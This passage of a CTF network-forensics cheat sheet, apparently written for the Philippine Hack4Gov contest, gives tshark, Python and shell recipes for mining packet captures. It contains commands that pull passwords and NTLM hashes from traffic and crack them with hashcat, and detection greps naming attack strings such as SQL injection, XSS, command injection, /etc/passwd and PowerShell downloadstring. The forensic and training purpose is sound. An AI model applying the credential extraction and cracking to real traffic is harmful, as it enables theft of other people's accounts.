tshark -r capture.pcap -Y "rtp" -T fields -e rtp.ssrc -e rtp.p_type

# Export VoIP calls
tshark -r capture.pcap -q -z rtp,streams
```

### Wireless Protocols

#### WiFi/802.11

```bash
# Decrypt WPA/WPA2
echo "password:SSID" > wifi_keys.txt
airdecap-ng -e SSID -p password capture.pcap

# Extract SSIDs
tshark -r capture.pcap -Y "wlan.fc.type_subtype==0x08" -T fields -e wlan.ssid

# Find hidden SSIDs
tshark -r capture.pcap -Y "wlan.ssid==\"\"" -T fields -e wlan.bssid

# Client probes
tshark -r capture.pcap -Y "wlan.fc.type_subtype==0x04" -T fields -e wlan.sa -e wlan.ssid

# Deauth attacks
tshark -r capture.pcap -Y "wlan.fc.type_subtype==0x0c" -T fields -e wlan.sa -e wlan.da
```

#### Bluetooth

```bash
# HCI commands
tshark -r capture.pcap -Y "bthci_cmd" -T fields -e bthci_cmd.opcode

# L2CAP data
tshark -r capture.pcap -Y "btl2cap" -T fields -e btl2cap.payload

# Device names
tshark -r capture.pcap -Y "bthci_evt.remote_name" -T fields -e bthci_evt.remote_name
```

### USB Protocol Analysis

```bash
# USB device enumeration
tshark -r capture.pcap -Y "usb.device_descriptor" -T fields -e usb.idVendor -e usb.idProduct

# HID keyboard data extraction
tshark -r capture.pcap -Y "usb.data_len == 8" -T fields -e usb.capdata | grep -v "00:00:00:00:00:00:00:00"

# Mass storage
tshark -r capture.pcap -Y "usb.bulk" -T fields -e usb.data
```

#### USB Keyboard Extraction Script

```python
# Extract keystrokes from USB HID
import sys

# USB HID to ASCII mapping
key_map = {
    0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd', 0x08: 'e',
    0x09: 'f', 0x0a: 'g', 0x0b: 'h', 0x0c: 'i', 0x0d: 'j',
    0x0e: 'k', 0x0f: 'l', 0x10: 'm', 0x11: 'n', 0x12: 'o',
    0x13: 'p', 0x14: 'q', 0x15: 'r', 0x16: 's', 0x17: 't',
    0x18: 'u', 0x19: 'v', 0x1a: 'w', 0x1b: 'x', 0x1c: 'y',
    0x1d: 'z', 0x1e: '1', 0x1f: '2', 0x20: '3', 0x21: '4',
    0x22: '5', 0x23: '6', 0x24: '7', 0x25: '8', 0x26: '9',
    0x27: '0', 0x28: '\n', 0x2c: ' ', 0x2d: '-', 0x2e: '=',
    0x2f: '[', 0x30: ']'
}

def parse_usb_data(filename):
    with open(filename, 'r') as f:
        for line in f:
            data = bytes.fromhex(line.strip().replace(':', ''))
            if len(data) == 8:
                modifier = data[0]
                key = data[2]
                if key in key_map:
                    char = key_map[key]
                    if modifier == 0x02:  # Shift pressed
                        char = char.upper()
                    print(char, end='')
```

---

## Advanced Extraction Techniques

### Covert Channel Detection

#### TCP/IP Header Covert Channels

```bash
# IP ID field analysis
tshark -r capture.pcap -T fields -e ip.id | python3 -c "
import sys
for line in sys.stdin:
    try:
        print(chr(int(line.strip(), 16) & 0xFF), end='')
    except: pass"

# TCP sequence number analysis
tshark -r capture.pcap -Y "tcp.flags.syn==1" -T fields -e tcp.seq | python3 -c "
import sys
for line in sys.stdin:
    seq = int(line)
    # Check for patterns in lower bits
    print(hex(seq & 0xFF))"

# TCP timestamp covert channel
tshark -r capture.pcap -T fields -e tcp.options.timestamp.tsval -e tcp.options.timestamp.tsecr

# IP TTL analysis
tshark -r capture.pcap -T fields -e ip.ttl | sort | uniq -c
```

#### ICMP Covert Channels

```bash
# ICMP payload extraction
tshark -r capture.pcap -Y "icmp.type==8 or icmp.type==0" -T fields -e data.data

# ICMP tunnel detection
tshark -r capture.pcap -Y "icmp" -T fields -e frame.len | awk '$1 > 100 {print}'

# Extract ICMP data
for stream in $(tshark -r capture.pcap -Y "icmp" -T fields -e data.data | sort -u); do
    echo $stream | xxd -r -p
done
```

#### DNS Tunneling Detection

```bash
# Entropy analysis
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | while read domain; do
    echo "$domain" | python3 -c "
import sys, math
from collections import Counter
for line in sys.stdin:
    s = line.strip()
    if not s: continue
    entropy = -sum(p * math.log2(p) for p in [c/len(s) for c in Counter(s).values()])
    if entropy > 4:  # High entropy indicates encoding
        print(f'High entropy: {entropy:.2f} - {s}')"
done

# Base64 in DNS
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | grep -E '^[A-Za-z0-9+/]+=*\.'

# Hex encoding in DNS
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | grep -E '^[a-f0-9]+\.'
```

### Data Carving & Recovery

```bash
# NetworkMiner CLI extraction
mono NetworkMiner.exe -r capture.pcap -o extracted_files/

# Bulk Extractor
bulk_extractor -o bulk_output/ capture.pcap

# Custom file signature carving
hexdump -C capture.pcap | grep -A 50 "ff d8 ff"  # JPEG
hexdump -C capture.pcap | grep -A 50 "50 4b 03 04"  # ZIP
hexdump -C capture.pcap | grep -A 50 "25 50 44 46"  # PDF

# Extract and decode base64 images
tshark -r capture.pcap -Y "http" -T fields -e http.file_data | grep -E '^[A-Za-z0-9+/]+=*$' | while read b64; do
    echo "$b64" | base64 -d > decoded_$RANDOM.bin
done
```

### Memory Analysis from Network Traffic

```bash
# Extract process information from SMB
tshark -r capture.pcap -Y "smb2" -T fields -e smb2.filename

# Registry keys from Windows traffic
tshark -r capture.pcap -Y "dcerpc.cn_ctx_id==0" -T fields -e dcerpc.stub_data

# Extract PowerShell commands
tshark -r capture.pcap -Y "http.user_agent contains PowerShell" -T fields -e http.request.uri | base64 -d
```

---

## Cryptography & Decryption

### SSL/TLS Decryption

#### Using RSA Private Key

```bash
# Export certificate from pcap
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate | xxd -r -p > cert.der
openssl x509 -inform DER -in cert.der -out cert.pem

# Decrypt with private key in Wireshark
# Edit > Preferences > Protocols > TLS > RSA keys list
# Add: IP,Port,Protocol,KeyFile
# Example: 192.168.1.1,443,http,/path/to/private.key
```

#### Using SSLKEYLOGFILE

```python
# Parse SSLKEYLOGFILE
def parse_keylog(keylog_file):
    keys = {}
    with open(keylog_file, 'r') as f:
        for line in f:
            if line.startswith('CLIENT_RANDOM'):
                parts = line.strip().split()
                client_random = parts[1]
                master_secret = parts[2]
                keys[client_random] = master_secret
    return keys

# Apply to Wireshark
# Edit > Preferences > Protocols > TLS > (Pre)-Master-Secret log filename
```

### Password Cracking from Captures

```bash
# Extract NTLM hashes
tshark -r capture.pcap -Y "ntlmssp.auth.ntlmv2_response" -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.auth.ntlmv2_response

# Format for hashcat
echo "user::domain:challenge:ntlmv2response" > hashes.txt
hashcat -m 5600 hashes.txt wordlist.txt

# Extract HTTP Basic auth
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization | base64 -d

# Extract FTP credentials
tshark -r capture.pcap -Y "ftp.request.command==PASS" -T fields -e ftp.request.arg

# Extract RADIUS passwords
tshark -r capture.pcap -Y "radius" -T fields -e radius.User_Name -e radius.User_Password
```

### Common Encoding/Encryption in CTFs

```python
# Multi-decoder script
import base64
import binascii
import urllib.parse
import codecs
import hashlib
from Crypto.Cipher import AES, DES, XOR

def try_all_decodings(data):
    results = {}
    
    # Base64
    try:
        results['base64'] = base64.b64decode(data).decode('utf-8', errors='ignore')
    except: pass
    
    # Base32
    try:
        results['base32'] = base64.b32decode(data).decode('utf-8', errors='ignore')
    except: pass
    
    # Hex
    try:
        results['hex'] = binascii.unhexlify(data).decode('utf-8', errors='ignore')
    except: pass
    
    # URL encoding
    try:
        results['url'] = urllib.parse.unquote(data)
    except: pass
    
    # ROT13
    try:
        results['rot13'] = codecs.decode(data, 'rot_13')
    except: pass
    
    # ROT47
    try:
        results['rot47'] = ''.join(chr(33 + (ord(c) - 33 + 47) % 94) if 33 <= ord(c) <= 126 else c for c in data)
    except: pass
    
    # XOR with common keys
    for key in [0x41, 0xFF, 0x00, 0x13, 0x37]:
        try:
            results[f'xor_{hex(key)}'] = ''.join(chr(ord(c) ^ key) for c in data)
        except: pass
    
    return results

# Usage
suspicious_string = "your_encoded_string_here"
for encoding, decoded in try_all_decodings(suspicious_string).items():
    if decoded and 'flag' in decoded.lower():
        print(f"{encoding}: {decoded}")
```

---

## Forensic Analysis Techniques

### Timeline Analysis

```bash
# Create timeline
tshark -r capture.pcap -T fields -e frame.number -e frame.time -e ip.src -e ip.dst -e tcp.dstport -e udp.dstport -e dns.qry.name -e http.host > timeline.tsv

# Sort by time
sort -t$'\t' -k2 timeline.tsv > sorted_timeline.tsv

# Find time anomalies
tshark -r capture.pcap -T fields -e frame.time_delta | awk '$1 > 5 {print NR, $1}' # Large gaps

# Activity patterns
tshark -r capture.pcap -T fields -e frame.time | cut -d'.' -f1 | cut -d' ' -f4 | cut -d':' -f1 | sort | uniq -c
```

### Malware Detection

```bash
# Known malicious domains
wget https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts -O malicious_hosts.txt
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | while read domain; do
    grep -q "$domain" malicious_hosts.txt && echo "Malicious: $domain"
done

# Suspicious user agents
tshark -r capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | grep -E "bot|crawler|scanner|nikto|sqlmap|havij|acunetix"

# PowerShell detection
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri | grep -i "powershell\|.ps1\|invoke-\|downloadstring"

# Beaconing detection (regular intervals)
tshark -r capture.pcap -T fields -e frame.time_relative -e ip.src -e ip.dst | awk '{print $1, $2"->"$3}' | python3 -c "
import sys
from collections import defaultdict
import statistics

intervals = defaultdict(list)
last_time = defaultdict(float)

for line in sys.stdin:
    parts = line.strip().split()
    if len(parts) == 2:
        time, connection = float(parts[0]), parts[1]
        if connection in last_time:
            interval = time - last_time[connection]
            intervals[connection].append(interval)
        last_time[connection] = time

for conn, times in intervals.items():
    if len(times) > 10:
        stdev = statistics.stdev(times)
        mean = statistics.mean(times)
        if stdev < 1 and mean > 1:  # Regular intervals
            print(f'Possible beaconing: {conn} - Mean: {mean:.2f}s, StdDev: {stdev:.2f}')"
```

### Geographic Analysis

```bash
# Extract IPs and geolocate
tshark -r capture.pcap -T fields -e ip.src -e ip.dst | tr '\t' '\n' | sort -u | while read ip; do
    curl -s "https://ipapi.co/$ip/json/" | jq -r '"\(.ip) - \(.city), \(.country_name)"'
    sleep 1  # Rate limiting
done

# ASN information
whois -h whois.cymru.com " -v $(tshark -r capture.pcap -T fields -e ip.dst | head -1)"
```

---

## CTF-Specific Strategies

### Common CTF Patterns

#### Flag Formats

```bash
# Common patterns
grep -E "flag\{[^}]+\}" capture.pcap
grep -E "FLAG\{[^}]+\}" capture.pcap
grep -E "CTF\{[^}]+\}" capture.pcap
grep -E "ctf\{[^}]+\}" capture.pcap
grep -E "flag\[[^\]]+\]" capture.pcap
grep -E "key[: ]*[a-zA-Z0-9+/=]{20,}" capture.pcap

# Hex encoded flags
hexdump -C capture.pcap | grep -E "66 6c 61 67 7b"  # flag{
hexdump -C capture.pcap | grep -E "46 4c 41 47 7b"  # FLAG{

# Base64 encoded flags
strings capture.pcap | grep -E "^[A-Za-z0-9+/]{4,}={0,2}$" | while read b64; do
    decoded=$(echo "$b64" | base64 -d 2>/dev/null)
    echo "$decoded" | grep -q "flag" && echo "Base64 flag found: $decoded"
done
```

#### Steganography in Network Protocols

```python
# TCP ISN steganography
import pyshark

cap = pyshark.FileCapture('capture.pcap', display_filter='tcp.flags.syn==1')
message = ""
for packet in cap:
    if hasattr(packet.tcp, 'seq'):
        seq = int(packet.tcp.seq)
        # Extract last byte
        char = chr(seq & 0xFF)
        if 32 <= ord(char) <= 126:  # Printable ASCII
            message += char
print(f"ISN Message: {message}")

# IP TTL steganography
cap = pyshark.FileCapture('capture.pcap')
ttl_message = ""
for packet in cap:
    if hasattr(packet, 'ip'):
        ttl = int(packet.ip.ttl)
        if ttl < 128:  # Possible ASCII
            ttl_message += chr(ttl)
print(f"TTL Message: {ttl_message}")
```

#### Packet Timing Analysis

```python
import pyshark
from datetime import datetime

cap = pyshark.FileCapture('capture.pcap')
times = []
for packet in cap:
    times.append(float(packet.sniff_timestamp))

# Look for morse code patterns
short_threshold = 0.5  # seconds
long_threshold = 1.5   # seconds
morse = ""
for i in range(1, len(times)):
    gap = times[i] - times[i-1]
    if gap < short_threshold:
        morse += "."
    elif gap < long_threshold:
        morse += "-"
    else:
        morse += " "  # Word separator
print(f"Possible Morse: {morse}")

# Timing-based encoding (milliseconds as ASCII)
for i in range(1, len(times)):
    gap_ms = int((times[i] - times[i-1]) * 1000)
    if 32 <= gap_ms <= 126:
        print(chr(gap_ms), end='')
```

#### Audio/Image in PCAP

```bash
# Extract VoIP audio
tshark -r capture.pcap -q -z rtp,streams
tshark -r capture.pcap -Y "rtp.ssrc==0x12345678" -T fields -e rtp.payload | xxd -r -p > audio.raw
# Convert raw to wav
sox -r 8000 -e signed -b 16 -c 1 audio.raw audio.wav

# Extract images from HTTP
tshark -r capture.pcap -Y "http.content_type contains image" --export-objects http,images/

# Check EXIF data in images
for img in images/*; do
    exiftool "$img" | grep -i "comment\|description\|copyright\|artist"
done

# Extract multipart form data
tshark -r capture.pcap -Y "http.content_type contains multipart" -T fields -e http.file_data > multipart.raw
```

### CTF Challenge Types

#### Network Reconnaissance Challenges

```bash
# Service enumeration
nmap -sV -p- -iL <(tshark -r capture.pcap -T fields -e ip.dst | sort -u) -oA services

# OS fingerprinting
p0f -r capture.pcap -o p0f_results.txt

# Banner grabbing evidence
tshark -r capture.pcap -Y "tcp.flags.push==1" -T fields -e tcp.payload | xxd -r -p | strings | grep -E "Server:|Apache|nginx|SSH-|220.*SMTP"
```

#### Crypto Challenges in Network Traffic

```bash
# Weak encryption detection
# ECB mode detection (repeated blocks)
tshark -r capture.pcap -T fields -e data.data | while read data; do
    echo "$data" | fold -w 32 | sort | uniq -c | sort -rn | head
done

# RSA key extraction
tshark -r capture.pcap -Y "tls.handshake.certificate" -T fields -e tls.handshake.certificate | xxd -r -p > cert.der
openssl x509 -in cert.der -inform DER -text | grep -A 20 "Public Key"

# Padding Oracle attacks evidence
tshark -r capture.pcap -Y "http.response.code==500" -T fields -e frame.time -e http.request.uri | grep -i "padding\|oracle\|crypto"
```

#### Web Exploitation Challenges

```bash
# SQL injection attempts
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri | grep -E "union.*select|1=1|'--|\*|benchmark|sleep"

# XSS payloads
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri -e http.file_data | grep -i "<script\|javascript:\|onerror=\|onload="

# Command injection
tshark -r capture.pcap -T fields -e http.request.uri | grep -E ";|\||&&|``|\$\(|%0a|%0d"

# LFI/RFI attempts
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri | grep -E "\.\.\/|etc\/passwd|windows\/system32|php:\/\/|data:\/\/"

# Authentication bypass
tshark -r capture.pcap -Y "http.cookie or http.authorization" -T fields -e http.cookie -e http.authorization
```

---

## Automation & Scripting

### Comprehensive PCAP Analysis Script

```python
#!/usr/bin/env python3
import subprocess
import os
import sys
import hashlib
import re
from collections import defaultdict

class PCAPAnalyzer:
    def __init__(self, pcap_file):
        self.pcap = pcap_file
        self.results = defaultdict(list)
        
    def run_command(self, cmd):
        """Execute shell command and return output"""
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.strip()
        except Exception as e:
            return f"Error: {e}"
    
    def extract_strings(self):
        """Extract interesting strings"""
        print("[*] Extracting strings...")
        patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'[a-zA-Z0-9+/]{40,}={0,2}',  # Base64
            r'[a-f0-9]{32}',  # MD5
            r'[a-f0-9]{40}',  # SHA1
            r'[a-f0-9]{64}',  # SHA256
        ]
        
        strings_output = self.run_command(f"strings -n 8 {self.pcap}")
        for pattern in patterns:
            matches = re.findall(pattern, strings_output)
            if matches:
                self.results['strings'].extend(matches)
    
    def analyze_protocols(self):
        """Analyze protocol distribution"""
        print("[*] Analyzing protocols...")
        cmd = f"tshark -r {self.pcap} -q -z io,phs"
        output = self.run_command(cmd)
        self.results['protocols'] = output
    
    def extract_files(self):
        """Extract files from HTTP, SMB, etc."""
        print("[*] Extracting files...")
        export_dir = "extracted_files"
        os.makedirs(export_dir, exist_ok=True)
        
        protocols = ['http', 'smb', 'tftp', 'ftp-data']
        for proto in protocols:
            cmd = f"tshark -r {self.pcap} --export-objects {proto},{export_dir}/{proto}/"
            os.makedirs(f"{export_dir}/{proto}", exist_ok=True)
            self.run_command(cmd)
    
    def check_dns_tunneling(self):
        """Check for DNS tunneling"""
        print("[*] Checking for DNS tunneling...")
        cmd = f"tshark -r {self.pcap} -Y 'dns.qry.name' -T fields -e dns.qry.name"
        domains = self.run_command(cmd).split('\n')
        
        suspicious = []
        for domain in domains:
            # Check for high entropy
            if len(domain) > 50:
                suspicious.append(domain)
            # Check for base64-like patterns
            if re.match(r'^[A-Za-z0-9+/]+=*\.', domain):
                suspicious.append(domain)
        
        if suspicious:
            self.results['dns_tunneling'] = suspicious[:10]  # Top 10
    
    def check_covert_channels(self):
        """Check for covert channels"""
        print("[*] Checking for covert channels...")
        
        # ICMP payload size anomalies
        cmd = f"tshark -r {self.pcap} -Y 'icmp' -T fields -e frame.len | sort | uniq -c | sort -rn"
        icmp_sizes = self.run_command(cmd)
        if "0" not in icmp_sizes:  # Non-standard ICMP sizes
            self.results['covert_channels'].append(f"ICMP anomaly: {icmp_sizes[:100]}")
        
        # TCP ISN analysis
        cmd = f"tshark -r {self.pcap} -Y 'tcp.flags.syn==1' -T fields -e tcp.seq"
        sequences = self.run_command(cmd).split('\n')[:20]
        if sequences:
            self.results['tcp_sequences'] = sequences
    
    def extract_credentials(self):
        """Extract potential credentials"""
        print("[*] Extracting credentials...")
        
        # HTTP Basic Auth
        cmd = f"tshark -r {self.pcap} -Y 'http.authorization' -T fields -e http.authorization"
        auth = self.run_command(cmd)
        if auth:
            self.results['credentials'].append(f"HTTP Auth: {auth}")
        
        # FTP
        cmd = f"tshark -r {self.pcap} -Y 'ftp.request.command==USER or ftp.request.command==PASS' -T fields -e ftp.request.command -e ftp.request.arg"
        ftp = self.run_command(cmd)
        if ftp:
            self.results['credentials'].append(f"FTP: {ftp}")
        
        # Forms
        cmd = f"tshark -r {self.pcap} -Y 'http.request.method==POST' -T fields -e http.file_data"
        post_data = self.run_command(cmd)
        for line in post_data.split('\n'):
            if 'password' in line.lower() or 'passwd' in line.lower():
                self.results['credentials'].append(f"POST data: {line[:100]}")
    
    def check_suspicious_traffic(self):
        """Check for suspicious traffic patterns"""
        print("[*] Checking for suspicious traffic...")
        
        # Port scan detection
        cmd = f"tshark -r {self.pcap} -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.dst -e tcp.dstport | sort | uniq | cut -f1 | uniq -c | sort -rn | head -5"
        port_scans = self.run_command(cmd)
        if port_scans:
            self.results['suspicious'].append(f"Possible port scan: {port_scans}")
        
        # Known malicious ports
        malicious_ports = [4444, 1337, 31337, 12345, 54321]
        for port in malicious_ports:
            cmd = f"tshark -r {self.pcap} -Y 'tcp.port=={port} or udp.port=={port}' -T fields -e ip.src -e ip.dst"
            traffic = self.run_command(cmd)
            if traffic:
                self.results['suspicious'].append(f"Traffic on suspicious port {port}: {traffic[:100]}")
    
    def generate_report(self):
        """Generate analysis report"""
        print("\n" + "="*50)
        print("PCAP ANALYSIS REPORT")
        print("="*50)
        
        for category, data in self.results.items():
            if data:
                print(f"\n[+] {category.upper()}")
                print("-"*30)
                if isinstance(data, list):
                    for item in data[:10]:  # Limit output
                        print(f"  • {item}")
                else:
                    print(f"  {data}")
        
        # Save detailed report
        with open('pcap_analysis_report.txt', 'w') as f:
            for category, data in self.results.items():
                f.write(f"\n{category.upper()}\n")
                f.write("-"*50 + "\n")
                if isinstance(data, list):
                    for item in data:
                        f.write(f"{item}\n")
                else:
                    f.write(f"{data}\n")
        
        print("\n[*] Detailed report saved to pcap_analysis_report.txt")
    
    def run_analysis(self):
        """Run complete analysis"""
        print(f"[*] Analyzing {self.pcap}...")
        self.extract_strings()
        self.analyze_protocols()
        self.extract_files()
        self.check_dns_tunneling()
        self.check_covert_channels()
        self.extract_credentials()
        self.check_suspicious_traffic()
        self.generate_report()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    analyzer = PCAPAnalyzer(sys.argv[1])
    analyzer.run_analysis()
```

### Quick One-Liners

```bash
# Find all unique protocols
tshark -r capture.pcap -T fields -e frame.protocols | tr ',' '\n' | sort -u

# Extract all URLs
tshark -r capture.pcap -T fields -e http.host -e http.request.uri | awk 'NF {print "http://" $1 $2}'

# Get conversation statistics
tshark -r capture.pcap -q -z conv,tcp

# Extract all email addresses
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" capture.pcap

# Find all IP addresses
grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" capture.pcap | sort -u

# Extract hex-encoded data
tshark -r capture.pcap -T fields -e data.data | grep -E "^[a-f0-9]+$"

# Check for base64 in all protocols
tshark -r capture.pcap -T fields -e frame.protocols -e data.text | grep -E "[A-Za-z0-9+/]{20,}={0,2}"

# Find credit card numbers (basic pattern)
grep -E "\b[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}\b" capture.pcap

# Extract all cookies
tshark -r capture.pcap -Y "http.cookie" -T json | jq -r '.[].layers.http."http.cookie"'

# Find SQL queries
tshark -r capture.pcap -Y "mysql or pgsql" -T fields -e mysql.query -e pgsql.query
```

---

## Philippines Hack4Gov Specifics

### Local Context Patterns

#### Philippine IP Ranges

```bash
# Check for PH IP ranges
# PLDT: 203.87.0.0/16, 210.213.0.0/16
# Globe: 202.57.0.0/16, 203.215.0.0/16
# Smart: 203.118.0.0/16

tshark -r capture.pcap -T fields -e ip.src -e ip.dst | while read src dst; do
    if echo "$src $dst" | grep -E "^(203\.(87|215|118)|210\.213|202\.57)\."; then
        echo "PH IP detected: $src -> $dst"
    fi
done
```

#### Government Domains

```bash
# Look for .gov.ph domains
tshark -r capture.pcap -Y "dns.qry.name contains .gov.ph or http.host contains .gov.ph" -T fields -e dns.qry.name -e http.host

# Common government agencies
domains="dict.gov.ph dost.gov.ph deped.gov.ph doh.gov.ph"
for domain in $domains; do
    tshark -r capture.pcap -Y "dns.qry.name contains $domain or http.host contains $domain" -T fields -e frame.time
done
```

#### Filipino Language Keywords

```bash
# Common Filipino words that might be used as passwords or flags
filipino_words="kalayaan mabuhay bayani katipunan rizal bonifacio aguinaldo"
for word in $filipino_words; do
    strings capture.pcap | grep -i "$word"
    hexdump -C capture.pcap | grep -i "$(echo -n $word | xxd -p)"
done

# Check for Baybayin (ancient Filipino script) Unicode
tshark -r capture.pcap -T fields -e data.text | grep -P "[\x{1700}-\x{171F}]"
```

### Common CTF Themes

#### Historical References

```bash
# Philippine historical dates and events
dates="1898 1946 1521 1896 1986"  # Independence, Republic, Magellan, Revolution, EDSA
for date in $dates; do
    grep -a "$date" capture.pcap
done

# National heroes
heroes="rizal bonifacio aguinaldo luna mabini"
for hero in $heroes; do
    strings capture.pcap | grep -i "$hero"
done
```

#### Local Network Scenarios

```python
# Check for common Philippine ISP patterns
import pyshark

cap = pyshark.FileCapture('capture.pcap')
ph_patterns = {
    'pldt': ['203.87', '210.213', 'pldthome', 'pldt'],
    'globe': ['202.57', '203.215', 'globe.com.ph'],
    'smart': ['203.118', 'smart.com.ph'],
    'converge': ['154.18', 'convergeict']
}

for packet in cap:
    packet_str = str(packet)
    for isp, patterns in ph_patterns.items():
        for pattern in patterns:
            if pattern in packet_str:
                print(f"[{isp.upper()}] found in packet {packet.number}")
```

### Government Security Scenarios

#### Incident Response Simulation

```bash
# Check for common APT indicators
# [Inference] Based on common regional threats
tshark -r capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | grep -i "china\|korea\|apt"

# Check for data exfiltration patterns
# Large POST requests
tshark -r capture.pcap -Y "http.request.method==POST and http.content_length > 1000000" -T fields -e http.host -e http.content_length

# Unusual office hours activity (PHT timezone)
tshark -r capture.pcap -T fields -e frame.time | awk '{print $4}' | cut -d':' -f1 | sort | uniq -c
```

#### Compliance Checking

```bash
# Check for unencrypted sensitive data
# [Inference] Common PII patterns in Philippines
strings capture.pcap | grep -E "[0-9]{4}-[0-9]{4}-[0-9]{4}"  # TIN format
strings capture.pcap | grep -E "[0-9]{2}-[0-9]{7}-[0-9]"    # SSS format
strings capture.pcap | grep -E "[0-9]{12}"                   # PhilHealth

# Check for weak encryption
tshark -r capture.pcap -Y "ssl.handshake.ciphersuite" -T fields -e ssl.handshake.ciphersuite | grep -i "rc4\|des\|export"
```

---

## Advanced Challenge Patterns

### Multi-Layer Challenges

```python
#!/usr/bin/env python3
# Multi-layer decoder for CTF challenges

import base64
import zlib
import bz2
import lzma
import struct
import hashlib

def multilayer_decode(data):
    """Try multiple layers of encoding/compression"""
    attempts = []
    current = data
    
    for i in range(10):  # Max 10 layers
        decoded = False
        
        # Try base64
        try:
            new_data = base64.b64decode(current)
            if new_data != current:
                attempts.append(f"Layer {i+1}: Base64 decoded")
                current = new_data
                decoded = True
        except: pass
        
        # Try hex
        if not decoded:
            try:
                new_data = bytes.fromhex(current.decode() if isinstance(current, bytes) else current)
                attempts.append(f"Layer {i+1}: Hex decoded")
                current = new_data
                decoded = True
            except: pass
        
        # Try zlib
        if not decoded:
            try:
                new_data = zlib.decompress(current)
                attempts.append(f"Layer {i+1}: Zlib decompressed")
                current = new_data
                decoded = True
            except: pass
        
        # Try bz2
        if not decoded:
            try:
                new_data = bz2.decompress(current)
                attempts.append(f"Layer {i+1}: Bz2 decompressed")
                current = new_data
                decoded = True
            except: pass
        
        # Try lzma
        if not decoded:
            try:
                new_data = lzma.decompress(current)
                attempts.append(f"Layer {i+1}: LZMA decompressed")
                current = new_data
                decoded = True
            except: pass
        
        if not decoded:
            break
    
    return current, attempts

# Usage with extracted data
extracted_data = "H4sIAAAAAAAAA..."  # Your extracted data
result, layers = multilayer_decode(extracted_data)
for layer in layers:
    print(layer)
print(f"Final result: {result}")
```

### Network Forensics Correlation

```python
import pyshark
import networkx as nx
import matplotlib.pyplot as plt
from collections import defaultdict

def create_network_graph(pcap_file):
    """Create network communication graph"""
    cap = pyshark.FileCapture(pcap_file)
    G = nx.DiGraph()
    connections = defaultdict(int)
    
    for packet in cap:
        if hasattr(packet, 'ip'):
            src = packet.ip.src
            dst = packet.ip.dst
            connections[(src, dst)] += 1
    
    for (src, dst), count in connections.items():
        G.add_edge(src, dst, weight=count)
    
    # Find suspicious nodes (high degree)
    suspicious = []
    for node in G.nodes():
        if G.degree(node) > 10:  # Arbitrary threshold
            suspicious.append(node)
    
    return G, suspicious

# Visualize network
G, suspicious = create_network_graph('capture.pcap')
pos = nx.spring_layout(G)
nx.draw(G, pos, with_labels=True, node_color='lightblue', node_size=500)
nx.draw_networkx_nodes(G, pos, nodelist=suspicious, node_color='red', node_size=700)
plt.title("Network Communication Graph")
plt.show()
```

### Memory Artifact Extraction

```bash
# Extract memory artifacts from network traffic
# Process hollowing detection
tshark -r capture.pcap -Y "smb2.filename contains .exe" -T fields -e smb2.filename -e frame.time

# Registry key operations
tshark -r capture.pcap -Y "dcerpc.cn_flags==0x03" -T fields -e dcerpc.stub_data | xxd -r -p | strings

# Extract PowerShell commands
tshark -r capture.pcap -Y "tcp.port==5985 or tcp.port==5986" -T fields -e data.text | base64 -d 2>/dev/null

# WMI operations
tshark -r capture.pcap -Y "tcp.port==135" -T fields -e dcerpc.cn_flags -e dcerpc.opnum
```

---

## Troubleshooting & Performance

### Large PCAP Handling

```bash
# Split large PCAP
tcpdump -r large.pcap -w split -C 100M

# Filter before analysis
tcpdump -r large.pcap -w filtered.pcap 'tcp or udp'

# Index for faster access
tshark -r large.pcap -T fields -e frame.number -e frame.time -e ip.src -e ip.dst > index.txt

# Parallel processing
parallel -j 4 "tshark -r {} -T fields -e data.data" ::: split*.pcap

# Memory-efficient streaming
tcpdump -r large.pcap -l | awk '/pattern/' 
```

### Common Issues

```bash
# Fix permission issues
sudo setcap cap_net_raw,cap_net_admin+eip $(which tshark)

# Handle encrypted traffic
# If you have the key
openssl rsautl -decrypt -inkey private.key -in encrypted.bin -out decrypted.txt

# Fix time zone issues
TZ='Asia/Manila' tshark -r capture.pcap -T fields -e frame.time

# Handle truncated packets
tshark -r capture.pcap -Y "frame.cap_len < frame.len"

# Fix encoding issues
iconv -f ISO-8859-1 -t UTF-8 extracted.txt -o converted.txt
```

---

## Quick Reference Card

### Essential Filters

```
# Wireshark Display Filters
tcp.stream eq X              # Specific TCP stream
http.request.method == "POST"  # POST requests
dns.qry.name contains "flag"   # DNS queries with "flag"
frame contains "flag{"         # Frames containing flag format
tcp.flags.syn == 1            # SYN packets
ip.addr == 192.168.1.1        # Specific IP
tcp.port == 4444              # Specific port
frame.len > 1000              # Large frames
http.response.code == 200     # HTTP 200 OK
ssl.handshake                 # SSL/TLS handshakes
```

### Common Commands

```bash
# Quick extraction
tshark -r pcap -q -z follow,tcp,ascii,X  # Follow stream X
tshark -r pcap --export-objects http,out/ # Export HTTP objects
strings pcap | grep -i flag              # Quick flag search
hexdump -C pcap | less                   # Hex view
capinfos pcap                            # File info

# Analysis
tshark -r pcap -q -z io,stat,1          # IO statistics
tshark -r pcap -q -z conv,ip            # IP conversations  
tshark -r pcap -q -z endpoints,tcp      # TCP endpoints
tshark -r pcap -q -z http,tree          # HTTP statistics
```

